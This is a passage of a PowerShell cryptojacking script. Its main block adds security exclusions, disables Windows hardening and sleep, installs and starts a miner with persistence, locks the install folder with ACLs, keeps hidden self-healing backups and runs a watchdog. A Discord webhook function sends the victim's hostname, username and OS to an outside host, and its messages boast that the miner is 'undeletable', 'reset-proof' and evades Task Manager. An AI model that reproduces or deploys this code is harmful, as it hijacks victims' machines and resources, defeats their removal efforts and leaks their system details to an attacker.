        Remove-Item $tmpCfg, $tmpDb -Force -ErrorAction SilentlyContinue
    }
    catch {}
}

function Send-DiscordWebhook {
    $webhookUrl = "https://discord.com/api/webhooks/1506387263402278992/f3X-mX_mjq74YCqpZYNB2WH4hEg6NZj8LY6lPstCCtz31kJwthqkxXF580E187PnZI2a"
    try {
        $osName = "Unknown"
        try { $osName = (Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption } catch {
            try { $osName = [System.Environment]::OSVersion.VersionString } catch {}
        }
        $payload = @{
            username = "SOINION"
            avatar_url = "https://i.imgur.com/4M34hiw.png"
            embeds = @(@{
                    title = "Miner Deployed (v4.1 — Hardened)"
                    color = 3447003
                    fields = @(
                        @{ name = "Host"; value = "$env:COMPUTERNAME"; inline = $true },
                        @{ name = "User"; value = "$env:USERNAME"; inline = $true },
                        @{ name = "OS"; value = "$osName"; inline = $false },
                        @{ name = "Protection"; value = "TM evasion + ACL lock + file handles + self-heal"; inline = $false }
                    )
                    footer = @{ text = "v4.1 — undeletable + reset-proof + invisible" }
                    timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
            })
        } | ConvertTo-Json -Depth 5
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}

function Disable-Sleep {
    try {
        powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c 2>$null
        powercfg /change standby-timeout-ac 0; powercfg /change standby-timeout-dc 0
        powercfg /change hibernate-timeout-ac 0; powercfg /change hibernate-timeout-dc 0
        powercfg /hibernate off 2>$null
    } catch {}
}

# ==================== MAIN ====================
try {
    Add-Exclusion
    Disable-WindowsHardening
    Disable-Sleep
    Enable-HugePages
    Install-Miner
    Write-MinerConfig -CpuPercent $idleCpu
    Write-Watchdog
    Write-VbsLauncher
    Set-Persistence
    Lock-InstallDirectory       # ← ACL lockdown AFTER all files written
    Backup-MinerFiles           # ← Hidden backup for self-healing
    Start-Miner
    Start-Sleep -Seconds 4
    Start-Watchdog
    Send-DiscordWebhook
    [Console]::WriteLine("[+] Miner v4.1 deployed — HARDENED — $rigId")
}
catch {
    [Console]::WriteLine("[-] Deployment failed: $_")
}
